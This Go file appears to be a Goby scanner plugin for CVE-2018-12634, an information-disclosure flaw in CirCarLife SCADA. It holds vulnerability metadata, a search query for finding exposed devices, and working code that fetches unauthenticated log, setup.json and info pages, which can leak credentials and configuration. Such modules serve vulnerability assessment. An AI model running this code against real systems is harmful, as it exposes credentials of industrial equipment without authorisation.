package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CirCarLife SCADA 4.3 Credential Disclosure",
    "Description": "<p>Circontrol is a Spanish manufacturer that insists on developing innovative technologies to provide competitive and comprehensive products and solutions for eMobility and efficiency of parking lots.</p><p>CirCarLife Scada all versions under 4.3.0 OCPP implementation all versions under 1.5.0 has an information disclosure vulnerability, leaking information such as logs and configuration</p>",
    "Impact": "CirCarLife SCADA 4.3 Credential Disclosure",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: https://circontrol.com.</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "CirCarLife-Scada",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "CirCarLife SCADA 4.3 版本信息泄露漏洞",
            "Description": "<p>Circontrol是一家西班牙制造商，坚持开发创新技术，为停车场的 eMobility 和效率提供具有竞争力和全面的产品和解决方案。</p><p>CirCarLife SCADA 在1.5.0至4.3.0版本存在信息泄露漏洞，泄露了日志及配置等信息</p>",
            "Impact": "<p>CirCarLife SCADA 在1.5.0至4.3.0版本存在信息泄露漏洞，泄露了日志及配置等信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://circontrol.com\">https://circontrol.com</a></p><p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "CirCarLife-Scada",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "CirCarLife SCADA 4.3 Credential Disclosure",
            "Description": "<p>Circontrol is a Spanish manufacturer that insists on developing innovative technologies to provide competitive and comprehensive products and solutions for eMobility and efficiency of parking lots.</p><p>CirCarLife Scada all versions under 4.3.0 OCPP implementation all versions under 1.5.0 has an information disclosure vulnerability, leaking information such as logs and configuration</p>",
            "Impact": "CirCarLife SCADA 4.3 Credential Disclosure",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: https://circontrol.com.</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "CirCarLife-Scada",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "banner=\"CirCarLife Scada\"",
    "GobyQuery": "banner=\"CirCarLife Scada\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://circontrol.com/",
    "DisclosureDate": "2018-09-10",
    "References": [
        "https://www.exploit-db.com/exploits/45384"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2018-12634"
    ],
    "CNVD": [
        "CNVD-2018-11985"
    ],
    "CNNVD": [
        "CNNVD-201806-1091"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "/html/repository,/services/system/setup.json,/html/log,/services/system/info.html",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "CirCarLife-Scada"
        ]
    },
    "PocId": "8576"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/html/repository"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "/circarlife/") && strings.Contains(resp.RawBody, "sources") {
					return true
				}
			}
			uri2 := "/services/system/setup.json"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "nameserver") && strings.Contains(resp.RawBody, "clientid") {
					return true
				}
			}
			uri3 := "/services/system/info.html"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Platform version") && strings.Contains(resp.RawBody, "Drivers") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := ss.Params["filepath"].(string)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
